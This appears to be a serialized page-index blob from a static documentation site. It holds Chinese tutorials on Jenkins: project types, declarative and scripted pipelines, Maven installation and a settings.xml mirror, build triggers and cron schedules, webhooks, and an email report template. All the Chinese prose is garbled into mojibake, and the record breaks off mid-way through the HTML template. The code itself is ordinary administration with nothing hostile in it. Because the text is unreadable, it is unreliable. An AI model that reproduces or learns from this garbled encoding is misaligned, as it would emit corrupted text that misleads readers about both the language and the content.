ä»£è¡¨ä¸ç»æä½ï¼æ¯å¦ï¼BuildãTestãDeployï¼Stage æ¯ä¸ä¸ªé»è¾åç»çæ¦å¿µã\n * Stepï¼æ­¥éª¤ï¼Step æ¯æåºæ¬çæä½ååï¼å¯ä»¥æ¯æå°ä¸å¥è¯ï¼ä¹å¯ä»¥æ¯æå»ºä¸ä¸ª Docker éåï¼ç±åç±» Jenkins æä»¶æä¾ï¼æ¯å¦å½ä»¤ï¼sh âmakeâï¼å°±ç¸å½äºæä»¬å¹³æ¶ shell ç»ç«¯ä¸­æ§è¡ make å½ä»¤ä¸æ ·ã\n\nnode {\n    def mvnHome\n    stage('æåä»£ç ') { // for display purposes\n        echo 'æåä»£ç '\n    }\n    stage('ç¼è¯æå»º') {\n        echo 'ç¼è¯æå»º'\n    }\n    stage('é¡¹ç®é¨ç½²') {\n        echo 'é¡¹ç®é¨ç½²'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n\n\n\n\n# ç¼è¯æåé¨ç½²\n\n\n# æåä»£ç \n\nå³äºå£°æå¼ç code ç¼åï¼å¯ä»¥éè¿å¿«æ·çæ¹å¼çæ\n\n\n\n\n\nå¨è¿éå¯ä»¥éç½®æä»¬ç git é¡¹ç®æåå°å\n\n\n\n\n\n\n\n\n# ç¼è¯æå\n\n\n\n\n\n\n\n\n\n\n# è¿ç¨é¨ç½²\n\n\n\nå¾å°åä¾ç¶ç¼è¯æ§è¡ãå¦ææ¯ jar åçï¼å¯ä»¥æåå¨æå¡å¨åå¥½èæ¬æ§è¡ï¼å¨ sh ' æ§è¡ä½ çèæ¬'\n\n\n# æ jenkins ç Pipeline èæ¬æ¾å°é¡¹ç®ä¸­æ§è¡ï¼Pipeline Script from SCMï¼\n\nåææä»¬é½æ¯ç´æ¥å¨ Jenkins ç UI çé¢ç¼å Pipeline ä»£ç ï¼è¿æ ·ä¸æ¹ä¾¿èæ¬ç»´æ¤ï¼å»ºè®®æ Pipeline èæ¬æ¾å¨é¡¹ç®ä¸­ï¼ä¸èµ·è¿è¡çæ¬æ§å¶ï¼\n\n1. å¨é¡¹ç®æ ¹ç®å½å»ºç« Jenkinsfile æä»¶ï¼æåå®¹å¤å¶å°è¯¥æä»¶ä¸­ï¼å¹¶æäº¤å° git ä»åº\n\n\n\n2. å¨é¡¹ç®ä¸­å¼ç¨è¯¥æä»¶\n\n\n\n\n\n\n\n",normalizedContent:"jenkins ä¸­èªå¨æå»ºé¡¹ç®çç±»åæå¾å¤ï¼å¸¸ç¨çæä»¥ä¸ä¸ç§ï¼\n\n * èªç±é£æ ¼è½¯ä»¶é¡¹ç®ï¼freestyle projectï¼å¯ä»¥æå»ºä¸åè¯­è¨çé¡¹ç®\n * maven é¡¹ç®ï¼maven projectï¼ä¸é¨åå¯¹ java è¯­è¨é¡¹ç®\n * æµæ°´çº¿é¡¹ç®ï¼pipeline projectï¼çµæ´»åº¦é«ï¼ç¨ä»£ç ç¼å jenkins æå»ºè¿ç¨ï¼å¦ k8s\n\næ¯ç§ç±»åçæå»ºå¶å®é½å¯ä»¥å®æä¸æ ·çæå»ºè¿ç¨ä¸ç»æï¼åªæ¯å¨æä½æ¹å¼ãçµæ´»åº¦ç­æ¹é¢ææåºå«ï¼å¨å®éå¼åä¸­å¯ä»¥æ ¹æ®èªå·±çéæ±åä¹ æ¯æ¥éæ©ãï¼psï¼ä¸ªäººæ¨èä½¿ç¨æµæ°´çº¿ç±»åï¼å ä¸ºçµæ´»åº¦éå¸¸é«ï¼\n\n\n# èªç±é£æ ¼é¡¹ç®æå»º\n\n1. åå»ºèªç±é£æ ¼é¡¹ç®\n\n\n\n\n\n2. éç½® git\n\n\n\n3. æå»º\n\n\n\n\n\n4. ç¼è¯æå\n\necho \"å¼å§ç¼è¯åæå\"\nmvn clean package\necho \"ç¼è¯åæåç»æ\"\n\n\n1\n2\n3\n\n\n\n\n\n\n\n\n5. é¨ç½²å°ç®æ æº\nå®è£ deploy to container æä»¶ï¼è¿ç§æä»¶éååå¸ war è¿ç§ç±»åçé¡¹ç®ï¼å° tomcat ç­å®¹å¨ä¸å»ã\n\n\n\n\n\n\n\n\n\ntomcat å­è¯éè¦èªå·±ç¾åº¦å»éç½®ä»¥ä¸ï¼å½ä½ éç½®æååï¼å¯ä»¥è®¿é®å° tomcat ç ip:8080/manager/html é¡µé¢ï¼éç½®å®ååå° jenkinsï¼é¨ç½²è¿ç¨ tomcat çæ¶åéè¦è¿ä¸ªå­è¯ã\n\n\n# maven é¡¹ç®\n\n1. å®è£ maven integration æä»¶\n2. æå»º maven é¡¹ç®\n\n\n\n\n\n\n\n\n# pipeline æµæ°´çº¿é¡¹ç®æå»º\n\n\n# pipeline ç®ä»\n\npipelineï¼ç®åæ¥è¯´ï¼å°±æ¯ä¸å¥è¿è¡å¨ jenkins ä¸çå·¥ä½æµæ¡æ¶ï¼å°åæ¥ç¬ç«è¿è¡äºåä¸ªæèå¤ä¸ªèç¹çä»»å¡è¿æ¥èµ·æ¥ï¼å®ç°åä¸ªä»»å¡é¾ä»¥å®æçå¤ææµç¨ç¼æåå¯è§åçå·¥ä½ã\n\nä½¿ç¨ pipeline æä»¥ä¸å¥½å¤ï¼\n\n * ä»£ç ï¼pipeline ä»¥ä»£ç çå½¢å¼å®ç°ï¼éå¸¸è¢«æ£å¥æºä»£ç æ§å¶ï¼ä½¿å¢éè½å¤ç¼è¾ï¼å®¡æ¥åè¿­ä»£å¶ä¼ éæµç¨ã\n * æä¹ï¼æ è®ºæ¯è®¡ååçè¿æ¯è®¡åå¤çæå¡å¨éå¯ï¼pipeline é½æ¯å¯æ¢å¤çã\n * å¯åæ­¢ï¼pipeline å¯æ¥æ¶äº¤äºå¼è¾å¥ï¼ä»¥ç¡®å®æ¯å¦ç»§ç»­æ§è¡ pipeline\n * å¤åè½ï¼pipeline æ¯æç°å®ä¸çä¸­å¤æçæç»­äº¤ä»è¦æ±ãå®æ¯æ fork/joinãå¾ªç¯æ§è¡ï¼å¹¶è¡æ§è¡ä»»å¡çåè½ã\n * å¯æ©å±ï¼pipeline æä»¶æ¯æå¶ dsl çèªå®ä¹æ©å± ï¼ä»¥åä¸å¶ä»æä»¶éæçå¤ä¸ªéé¡¹ã\n\nå¦ä½åå»º jenkins pipelineï¼\n\n * pipeline èæ¬æ¯ç± groovy è¯­è¨å®ç°çï¼ä½æ¯æä»¬æ²¡å¿è¦åç¬å»å­¦ä¹  groovy\n * pipeline æ¯æä¸¤ç§è¯­æ³ï¼declarative (å£°æå¼) å scripted pipeline (èæ¬å¼) è¯­æ³ï¼scripted pipeline æ¯ææ´å¤ç groovy è¯­è¨ï¼ä¸ååèåé£ä¹å¤çç»æåéå¶ãç±äºå¯ä»¥ç¼åçµæ´»çé»è¾ï¼å¯ä»¥è®¤ä¸ºæ¯é«çº§çç pipelineï¼å¦æä½ æ³å®ç°çé»è¾æ¯è¾çµæ´»ï¼æ¯å¦æå¤æ­ãåæ¯ï¼æèéè¦ç¨ groovy è¯­è¨ç¼åå¤æçè¿è¡æ­¥éª¤ï¼é½åºè¯¥éæ©ä½¿ç¨ scripted pipelineã\n * pipeline ä¹æä¸¤ç§åå»ºæ¹æ³ï¼å¯ä»¥ç´æ¥å¨ jenkins ç web ui çé¢ä¸­è¾å¥èæ¬ï¼ä¹å¯ä»¥éè¿åå»ºä¸ä¸ª jenkinsfile èæ¬æä»¶æ¾å¥é¡¹ç®æºç åºä¸­ï¼ä¸è¬æä»¬é½æ¨èå¨ jenkins ä¸­ç´æ¥ä»æºä»£ç æ§å¶ (scm) ä¸­ç´æ¥è½½å¥ jenkinsfile pipeline è¿ç§æ¹æ³ï¼ã\n\n\n# å®è£ pipeline æä»¶\n\n\n\n> å®è£å®æ¯è®°å¾éå¯\n\nå®è£æä»¶æå¾å¤ä¾èµæä»¶ä¼å®è£å¤±è´¥ï¼ä¸ç¨ç®¡ï¼åªè¦åå»ºé¡¹ç®çæ¶åå¤äº âæµæ°´çº¿â ç±»åå³å¯ã\n\n\n\nä½ ä¼å¨é¡¹ç®çéç½®ä¸­çå°å¤äºä¸ä¸ªæµæ°´çº¿ï¼å®å°±æ¯åä»£äºä»¥ä¸é¡¹ç®çæå»ºåæå»ºåçä¸äºå·¥ä½ã\n\n\n\nä»¥ä¸æ¯åºäºä¸ä¸ªå£°æå¼ **ï¼declarativeï¼ç pipeline**ï¼ä»¥ pipeline å¼å¤´çå°±æ¯å£°æå¼çã\nstagesï¼ä»£è¡¨æ´ä¸ªæµæ°´çº¿çæææ§è¡é¶æ®µãéå¸¸ stages åªæ 1 ä¸ªï¼éé¢åå«å¤ä¸ª stage\nstageï¼ä»£è¡¨æµæ°´çº¿ä¸­çæä¸ªé¶æ®µï¼å¯è½åºç° n ä¸ªãä¸è¬åä¸ºæåä»£ç ï¼ç¼è¯æå»ºï¼é¨ç½²ç­é¶æ®µã\nstepsï¼ä»£è¡¨ä¸ä¸ªé¶æ®µåéè¦æ§è¡çé»è¾ (æ­¥éª¤)ãsteps éé¢æ¯ shell èæ¬ï¼git æåä»£ç ï¼ssh è¿ç¨åå¸ç­ä»»æåå®¹ã\næ¨¡æä¸æ®µï¼ç¶åæ§è¡ççææ\n\npipeline {\n    agent any\n\n    stages {\n        stage('æåä»£ç ') {\n            steps {\n                echo 'æåä»£ç '\n            }\n        }\n        stage('ç¼è¯æå»º') {\n            steps {\n                echo 'ç¼è¯æå»º'\n            }\n        }\n        stage('é¡¹ç®é¨ç½²') {\n            steps {\n                echo 'é¡¹ç®é¨ç½²'\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n\n\n# scripted pipeline èæ¬å¼ - pipeline\n\n\n\n * nodeï¼èç¹ï¼ä¸ä¸ª node å°±æ¯ä¸ä¸ª jenkins èç¹ï¼master æè agentï¼æ¯æ§è¡ step çå·ä½è¿è¡ç¯å¢ï¼åç»­è®²å° jenkins ç master-slave æ¶æçæ¶åç¨å°ã\n * stageï¼é¶æ®µï¼ä¸ä¸ª pipeline å¯ä»¥ååä¸ºè¥å¹²ä¸ª stageï¼æ¯ä¸ª stage ä»£è¡¨ä¸ç»æä½ï¼æ¯å¦ï¼buildãtestãdeployï¼stage æ¯ä¸ä¸ªé»è¾åç»çæ¦å¿µã\n * stepï¼æ­¥éª¤ï¼step æ¯æåºæ¬çæä½ååï¼å¯ä»¥æ¯æå°ä¸å¥è¯ï¼ä¹å¯ä»¥æ¯æå»ºä¸ä¸ª docker éåï¼ç±åç±» jenkins æä»¶æä¾ï¼æ¯å¦å½ä»¤ï¼sh âmakeâï¼å°±ç¸å½äºæä»¬å¹³æ¶ shell ç»ç«¯ä¸­æ§è¡ make å½ä»¤ä¸æ ·ã\n\nnode {\n    def mvnhome\n    stage('æåä»£ç ') { // for display purposes\n        echo 'æåä»£ç '\n    }\n    stage('ç¼è¯æå»º') {\n        echo 'ç¼è¯æå»º'\n    }\n    stage('é¡¹ç®é¨ç½²') {\n        echo 'é¡¹ç®é¨ç½²'\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n\n\n\n\n# ç¼è¯æåé¨ç½²\n\n\n# æåä»£ç \n\nå³äºå£°æå¼ç code ç¼åï¼å¯ä»¥éè¿å¿«æ·çæ¹å¼çæ\n\n\n\n\n\nå¨è¿éå¯ä»¥éç½®æä»¬ç git é¡¹ç®æåå°å\n\n\n\n\n\n\n\n\n# ç¼è¯æå\n\n\n\n\n\n\n\n\n\n\n# è¿ç¨é¨ç½²\n\n\n\nå¾å°åä¾ç¶ç¼è¯æ§è¡ãå¦ææ¯ jar åçï¼å¯ä»¥æåå¨æå¡å¨åå¥½èæ¬æ§è¡ï¼å¨ sh ' æ§è¡ä½ çèæ¬'\n\n\n# æ jenkins ç pipeline èæ¬æ¾å°é¡¹ç®ä¸­æ§è¡ï¼pipeline script from scmï¼\n\nåææä»¬é½æ¯ç´æ¥å¨ jenkins ç ui çé¢ç¼å pipeline ä»£ç ï¼è¿æ ·ä¸æ¹ä¾¿èæ¬ç»´æ¤ï¼å»ºè®®æ pipeline èæ¬æ¾å¨é¡¹ç®ä¸­ï¼ä¸èµ·è¿è¡çæ¬æ§å¶ï¼\n\n1. å¨é¡¹ç®æ ¹ç®å½å»ºç« jenkinsfile æä»¶ï¼æåå®¹å¤å¶å°è¯¥æä»¶ä¸­ï¼å¹¶æäº¤å° git ä»åº\n\n\n\n2. å¨é¡¹ç®ä¸­å¼ç¨è¯¥æä»¶\n\n\n\n\n\n\n\n",charsets:{cjk:!0}},{title:"Jenkins(å) Mavenå®è£åéç½®",frontmatter:{title:"Jenkins(å) Mavenå®è£åéç½®",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/503",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/50.Jenkins/503.Jenkins(%E5%9B%9B)%20Maven%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE.html",relativePath:"04.è¿ç»´/50.Jenkins/503.Jenkins(å) Mavenå®è£åéç½®.md",key:"v-2ae3d180",path:"/jenkins/503/",headers:[{level:2,title:"å®è£Maven",slug:"å®è£maven",normalizedTitle:"å®è£ maven",charIndex:21},{level:3,title:"éç½®ç¯å¢åé",slug:"éç½®ç¯å¢åé",normalizedTitle:"éç½®ç¯å¢åé",charIndex:181},{level:3,title:"å¨å±å·¥å·éç½®å³èJDKåMaven",slug:"å¨å±å·¥å·éç½®å³èjdkåmaven",normalizedTitle:"å¨å±å·¥å·éç½®å³è jdk å maven",charIndex:405},{level:3,title:"æ·»å Jenkinså¨å±åé",slug:"æ·»å jenkinså¨å±åé",normalizedTitle:"æ·»å  jenkins å¨å±åé",charIndex:492},{level:3,title:"ä¿®æ¹Mavençsettings.xml",slug:"ä¿®æ¹mavençsettings-xml",normalizedTitle:"ä¿®æ¹ maven ç settings.xml",charIndex:516},{level:3,title:"æµè¯Mavenæ¯å¦éç½®æå",slug:"æµè¯mavenæ¯å¦éç½®æå",normalizedTitle:"æµè¯ maven æ¯å¦éç½®æå",charIndex:889}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"å®è£Maven éç½®ç¯å¢åé å¨å±å·¥å·éç½®å³èJDKåMaven æ·»å Jenkinså¨å±åé ä¿®æ¹Mavençsettings.xml æµè¯Mavenæ¯å¦éç½®æå",content:"å¨ Jenkins éææå¡å¨ä¸ï¼æä»¬éè¦å®è£ Maven æ¥ç¼è¯åæåé¡¹ç®ã\n\n\n# å®è£ Maven\n\nåä¸ä¼  Maven è½¯ä»¶å°æå¡å¨\n\n# è§£å\ntar -xzf apache-maven-3.6.2-bin.tar.gz \n# ç§»å¨æä»¶\nmv apache-maven-3.6.2 /opt/software/maven\n\n\n1\n2\n3\n4\n\n\n\n# éç½®ç¯å¢åé\n\nvim /etc/profile\nexport JAVA_HOME=/opt/software/java8\nexport MAVEN_HOME=/opt/software/maven\nexport PATH=$PATH:$JAVA_HOME/bin:$MAVEN_HOME/bin\n\n\n1\n2\n3\n4\n\n\n# éç½®çæ\nsource /etc/profile \n# æ¥æ¾Mavençæ¬\nmvn -v \n\n\n1\n2\n3\n4\n\n\n\n# å¨å±å·¥å·éç½®å³è JDK å Maven\n\nJenkins->Global Tool Configuration->JDK-> æ°å¢ JDKï¼éç½®å¦ä¸ï¼\n\n\n\n\n\n\n\n\n# æ·»å  Jenkins å¨å±åé\n\n\n\n\n\n\n# ä¿®æ¹ Maven ç settings.xml\n\n# åå»ºæ¬å°ä»åºç®å½\nmkdir /opt/software/maven/repo \n# ä¿®æ¹æä»¶åå®¹\nvi /opt/software/maven/conf/settings.xml\n\n\n1\n2\n3\n4\n\n\n<localRepository>/opt/software/maven/repo</localRepository>\n<mirror>\n\t<id>alimaven</id>\n\t<name>aliyun maven</name>\n\t<url>https://maven.aliyun.com/nexus/content/groups/public/</url>\n\t<mirrorOf>central</mirrorOf>\n</mirror> \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# æµè¯ Maven æ¯å¦éç½®æå\n\nä½¿ç¨ä¹åç gitlab å¯ç æµè¯é¡¹ç®ï¼ä¿®æ¹ jenkins é¡¹ç®éç½®\n\n\n\n\n\n\n\n\n\næä»¬å° jenkins æå¡å¨ç /var/lib/jenkins/workspace/test01/target/ ä¸é¢å°±å¯ä»¥çå°æä»¬æç jar å\n\n> è¿éåé¦ä¸ä¸ªé®é¢ï¼æè¿éä½¿ç¨çæ¯ maven ç§æï¼nexusï¼ï¼maven éç½®æåä½é¡¹ç®å°±æ¯æ²¡åæ³æåå°èªå·±åå¸ç jarï¼åå æ¯æä¸è½½çæ¯ maven3.8.xï¼æ¢æ 3.6 å°±å¯ä»¥äºï¼çå°åå è¯´æ¯å ä¸º 3.8.x æ°å äº jar çå®å¨é»å¡é®é¢ã",normalizedContent:"å¨ jenkins éææå¡å¨ä¸ï¼æä»¬éè¦å®è£ maven æ¥ç¼è¯åæåé¡¹ç®ã\n\n\n# å®è£ maven\n\nåä¸ä¼  maven è½¯ä»¶å°æå¡å¨\n\n# è§£å\ntar -xzf apache-maven-3.6.2-bin.tar.gz \n# ç§»å¨æä»¶\nmv apache-maven-3.6.2 /opt/software/maven\n\n\n1\n2\n3\n4\n\n\n\n# éç½®ç¯å¢åé\n\nvim /etc/profile\nexport java_home=/opt/software/java8\nexport maven_home=/opt/software/maven\nexport path=$path:$java_home/bin:$maven_home/bin\n\n\n1\n2\n3\n4\n\n\n# éç½®çæ\nsource /etc/profile \n# æ¥æ¾mavençæ¬\nmvn -v \n\n\n1\n2\n3\n4\n\n\n\n# å¨å±å·¥å·éç½®å³è jdk å maven\n\njenkins->global tool configuration->jdk-> æ°å¢ jdkï¼éç½®å¦ä¸ï¼\n\n\n\n\n\n\n\n\n# æ·»å  jenkins å¨å±åé\n\n\n\n\n\n\n# ä¿®æ¹ maven ç settings.xml\n\n# åå»ºæ¬å°ä»åºç®å½\nmkdir /opt/software/maven/repo \n# ä¿®æ¹æä»¶åå®¹\nvi /opt/software/maven/conf/settings.xml\n\n\n1\n2\n3\n4\n\n\n<localrepository>/opt/software/maven/repo</localrepository>\n<mirror>\n\t<id>alimaven</id>\n\t<name>aliyun maven</name>\n\t<url>https://maven.aliyun.com/nexus/content/groups/public/</url>\n\t<mirrorof>central</mirrorof>\n</mirror> \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# æµè¯ maven æ¯å¦éç½®æå\n\nä½¿ç¨ä¹åç gitlab å¯ç æµè¯é¡¹ç®ï¼ä¿®æ¹ jenkins é¡¹ç®éç½®\n\n\n\n\n\n\n\n\n\næä»¬å° jenkins æå¡å¨ç /var/lib/jenkins/workspace/test01/target/ ä¸é¢å°±å¯ä»¥çå°æä»¬æç jar å\n\n> è¿éåé¦ä¸ä¸ªé®é¢ï¼æè¿éä½¿ç¨çæ¯ maven ç§æï¼nexusï¼ï¼maven éç½®æåä½é¡¹ç®å°±æ¯æ²¡åæ³æåå°èªå·±åå¸ç jarï¼åå æ¯æä¸è½½çæ¯ maven3.8.xï¼æ¢æ 3.6 å°±å¯ä»¥äºï¼çå°åå è¯´æ¯å ä¸º 3.8.x æ°å äº jar çå®å¨é»å¡é®é¢ã",charsets:{cjk:!0}},{title:"Jenkins(å­) Jenkinsé¡¹ç®æå»ºç»è",frontmatter:{title:"Jenkins(å­) Jenkinsé¡¹ç®æå»ºç»è",date:"2023-06-25T09:22:36.000Z",permalink:"/jenkins/505",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/50.Jenkins/505.Jenkins(%E5%85%AD)%20Jenkins%E9%A1%B9%E7%9B%AE%E6%9E%84%E5%BB%BA%E7%BB%86%E8%8A%82.html",relativePath:"04.è¿ç»´/50.Jenkins/505.Jenkins(å­) Jenkinsé¡¹ç®æå»ºç»è.md",key:"v-2df2013e",path:"/jenkins/505/",headers:[{level:2,title:"åç½®è§¦åå¨",slug:"åç½®è§¦åå¨",normalizedTitle:"åç½®è§¦åå¨",charIndex:2},{level:3,title:"è¿ç¨æå»º",slug:"è¿ç¨æå»º",normalizedTitle:"è¿ç¨æå»º",charIndex:36},{level:3,title:"å¶ä»å·¥ç¨æå»ºåè§¦å",slug:"å¶ä»å·¥ç¨æå»ºåè§¦å",normalizedTitle:"å¶ä»å·¥ç¨æå»ºåè§¦å",charIndex:60},{level:3,title:"å®æ¶æå»º",slug:"å®æ¶æå»º",normalizedTitle:"å®æ¶æå»º",charIndex:135},{level:3,title:"è½®è¯¢SCM",slug:"è½®è¯¢scm",normalizedTitle:"è½®è¯¢ scm",charIndex:188},{level:2,title:"Git hookèªå¨è§¦åæå»º",slug:"git-hookèªå¨è§¦åæå»º",normalizedTitle:"git hook èªå¨è§¦åæå»º",charIndex:843},{level:3,title:"å®è£Gitlab Hookæä»¶",slug:"å®è£gitlab-hookæä»¶",normalizedTitle:"å®è£ gitlab hook æä»¶",charIndex:991},{level:2,title:"Jenkinsçåæ°åæå»º",slug:"jenkinsçåæ°åæå»º",normalizedTitle:"jenkins çåæ°åæå»º",charIndex:1189},{level:3,title:"String Parameter",slug:"string-parameter",normalizedTitle:"string parameter",charIndex:1290},{level:2,title:"éç½®é®ç®±æå¡å¨åéæå»ºç»æ",slug:"éç½®é®ç®±æå¡å¨åéæå»ºç»æ",normalizedTitle:"éç½®é®ç®±æå¡å¨åéæå»ºç»æ",charIndex:1373},{level:3,title:"å®è£ Email Extension æä»¶",slug:"å®è£-email-extension-æä»¶",normalizedTitle:"å®è£ email extension æä»¶",charIndex:1391},{level:3,title:"åå¤é®ä»¶åå®¹",slug:"åå¤é®ä»¶åå®¹",normalizedTitle:"åå¤é®ä»¶åå®¹",charIndex:1518},{level:2,title:"jenkins éç½® SonarQubeï¼ä»£ç å®¡æ¥ï¼",slug:"jenkins-éç½®-sonarqube-ä»£ç å®¡æ¥",normalizedTitle:"jenkins éç½® sonarqubeï¼ä»£ç å®¡æ¥ï¼",charIndex:5380}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"åç½®è§¦åå¨ è¿ç¨æå»º å¶ä»å·¥ç¨æå»ºåè§¦å å®æ¶æå»º è½®è¯¢SCM Git hookèªå¨è§¦åæå»º å®è£Gitlab Hookæä»¶ Jenkinsçåæ°åæå»º String Parameter éç½®é®ç®±æå¡å¨åéæå»ºç»æ å®è£ Email Extension æä»¶ åå¤é®ä»¶åå®¹ jenkins éç½® SonarQubeï¼ä»£ç å®¡æ¥ï¼",content:'# åç½®è§¦åå¨\n\nJenkins åç½® 4 ç§æå»ºè§¦åå¨ï¼\n\n * è§¦åè¿ç¨æå»ºï¼éè¿ä¸ä¸ªè¿ç¨å°åè§¦åé¡¹ç®çæ§è¡\n * å¶ä»å·¥ç¨æå»ºåè§¦åï¼Build after other projects are buildï¼ï¼å°±æ¯éè¦åé¢ä¸ä¸ªé¡¹ç®æå»ºå®æåè§¦åæçé¡¹ç®æå»º\n * å®æ¶æå»ºï¼Build periodicallyï¼ï¼é¡¾åæä¹å°±æ¯ ç±»ä¼¼äº corn è¡¨è¾¾å¼ï¼å®æ¶æ§è¡\n * è½®è¯¢ SCMï¼Poll SCMï¼ï¼ä¼å®æ¶æ«ææ¬å°ä»£ç ä»åºæ¯å¦æåæ´ï¼å¦æä»£ç æåæ´å°±è§¦åé¡¹ç®æå»º\n\n\n# è¿ç¨æå»º\n\nå¨é¡¹ç®ä¸­çéç½®ä¸­ï¼æå»ºè§¦åå¨éä¸­è¿ç¨æå»ºã\n\n\n\néè¿æµè§å¨è®¿é® http://192.168.81.102:7777/job/test01/build?token=6666 è¿è¡é¡¹ç®æå»º\n\n\n# å¶ä»å·¥ç¨æå»ºåè§¦å\n\n\n\n\n\nåºç¨ä¿å­åï¼å°±å¯ä»¥æå»º maven_project äºã\n\n\n# å®æ¶æå»º\n\nå®æ¶å­ç¬¦ä¸²ä»å·¦å¾å³åå«ä¸ºï¼ å æ¶ æ¥ æ å¨\nä¸äºå®æ¶è¡¨è¾¾å¼çä¾å­ï¼\n\n# æ¯30åéæå»ºä¸æ¬¡ï¼Hä»£è¡¨å½¢å(ä»£è¡¨å°æ¶ï¼æµè¯ç¨ *)\nH/30 * * * * 10:02 10:32\n# æ¯2ä¸ªå°æ¶æå»ºä¸æ¬¡: \nH H/2 * * *\n# æ¯å¤©ç8ç¹ï¼12ç¹ï¼22ç¹ï¼ä¸å¤©æå»º3æ¬¡ï¼ (å¤ä¸ªæ¶é´ç¹ä¸­é´ç¨éå·éå¼) \n0 8,12,22 * * *\n# æ¯å¤©ä¸­å12ç¹å®æ¶æå»ºä¸æ¬¡ \nH 12 * * *\n# æ¯å¤©ä¸å18ç¹å®æ¶æå»ºä¸æ¬¡ \nH 18 * * *\n# å¨æ¯ä¸ªå°æ¶çååä¸ªå°æ¶åçæ¯10åé H(0-29)/10 * * * *\n# æ¯ä¸¤å°æ¶ä¸æ¬¡ï¼æ¯ä¸ªå·¥ä½æ¥ä¸å9ç¹å°ä¸å5ç¹(ä¹è®¸æ¯ä¸å10:38ï¼ä¸å12:38ï¼ä¸å2:38ï¼ä¸å4:38) H H(9-16)/2 * * 1-5\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n\n\n# è½®è¯¢ SCM\n\nè¯¥æå»ºè§¦åå¨ï¼Jenkins ä¼å®æ¶æ«ææ¬å°æ´ä¸ªé¡¹ç®çä»£ç ï¼å¢å¤§ç³»ç»çå¼éï¼ä¸å»ºè®®ä½¿ç¨ã\n\n\n\n\n# Git hook èªå¨è§¦åæå»º\n\nå¨ Jenkins çåç½®æå»ºè§¦åå¨ä¸­ï¼è½®è¯¢ SCM å¯ä»¥å®ç° Gitlab ä»£ç æ´æ°ï¼é¡¹ç®èªå¨æå»ºï¼ä½æ¯è¯¥æ¹æ¡çæ§è½ä¸ä½³ãé£ææ²¡ææ´å¥½çæ¹æ¡å¢ï¼ æçãå°±æ¯å©ç¨ Gitlab ç webhook å®ç°ä»£ç  push å°ä»åºï¼ç«å³è§¦åé¡¹ç®èªå¨æå»ºã\n\n\n\n\n# å®è£ Gitlab Hook æä»¶\n\néè¦å®è£ä¸¤ä¸ªæä»¶ï¼Gitlab Hook å GitLabï¼å®è£å¥½åå¨é¡¹ç®éç½®çæå»ºè§¦åå¨ä¸­ï¼ä¼å¤ä¸ä¸ªéé¡¹\n\n\n\nå³äº Gitlab ä¹åçæä½è¯·ç¾åº¦ï¼æè¿éä½¿ç¨çæ¯ giteaã\n\ngitea éè¦ä¸è½½ Generic Webhook Trigger æä»¶ï¼å®è£åå°é¡¹ç®éç½®\n\n\n\n\n\n\n\n\n\néç½®å®æåå°±å¯ä»¥æµè¯äºï¼åªè¦æäº¤äºä»£ç å°±ä¼æå»ºé¡¹ç®ã\n\n\n# Jenkins çåæ°åæå»º\n\nææ¶å¨é¡¹ç®æå»ºçè¿ç¨ä¸­ï¼æä»¬éè¦æ ¹æ®ç¨æ·çè¾å¥å¨æä¼ å¥ä¸äºåæ°ï¼ä»èå½±åæ´ä¸ªæå»ºç»æï¼è¿æ¶æä»¬å¯ä»¥ä½¿ç¨åæ°åæå»ºã\n\nJenkins æ¯æéå¸¸ä¸°å¯çåæ°ç±»å\n\n\n\n\n# String Parameter\n\nè¿æ ·çæ¹å¼åªè½éç¨äº pipeline é¡¹ç®\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nè¿ç§æ¹å¼è¾å¥åªä¸ªåæ¯ï¼å°±æå»ºåªä¸ªåæ¯\n\n\n# éç½®é®ç®±æå¡å¨åéæå»ºç»æ\n\n\n# å®è£ Email Extension æä»¶\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nå¯ä»¥æµè¯åé\n\n> å¦æ jenkins æ¥éï¼ Can\'t send command to SMTP host; æå¯è½æ¯ç®¡çåçé®ç®±æ²¡æå¡«åæèåè®¤è¯èçé®ç®±ä¸ç¸åã\n\n\n# åå¤é®ä»¶åå®¹\n\nå¨é¡¹ç®æ ¹ç®å½ç¼å email.htmlï¼å¹¶ææä»¶æ¨é git\n\n<!DOCTYPE html>\n<html>\n<head>\n    <meta charset="UTF-8">\n    <title>${ENV, var="JOB_NAME"}-ç¬¬${BUILD_NUMBER}æ¬¡æå»ºæ¥å¿</title>\n</head>\n<body leftmargin="8" marginwidth="0" topmargin="8" marginheight="4" offset="0">\n<table width="95%" cellpadding="0" cellspacing="0" style="font-size: 11pt; font-family: Tahoma, Arial, Helvetica, sansserif">\n    <tr>\n        <td>(æ¬é®ä»¶æ¯ç¨åºèªå¨ä¸åçï¼è¯·å¿åå¤ï¼)</td>\n    </tr>\n    <tr>\n        <td><h2>\n            <font color="#0000FF">æå»ºç»æ - ${BUILD_STATUS}</font>\n        </h2></td>\n    </tr>\n    <tr>\n        <td><br/>\n            <b><font color="#0B610B">æå»ºä¿¡æ¯</font></b>\n            <hr size="2" width="100%" align="center"/>\n        </td>\n    </tr>\n    <tr>\n        <td>\n            <ul>\n                <li>é¡¹ç®åç§°&nbsp;ï¼&nbsp;${PROJECT_NAME}</li>\n                <li>æå»ºç¼å·&nbsp;ï¼&nbsp;ç¬¬${BUILD_NUMBER}æ¬¡æå»º</li>\n                <li>è§¦ååå ï¼&nbsp;${CAUSE}</li>\n                <li>æå»ºæ¥å¿ï¼&nbsp;\n                    <a href="${BUILD_URL}console">${BUILD_URL}console</a>\n                </li>\n                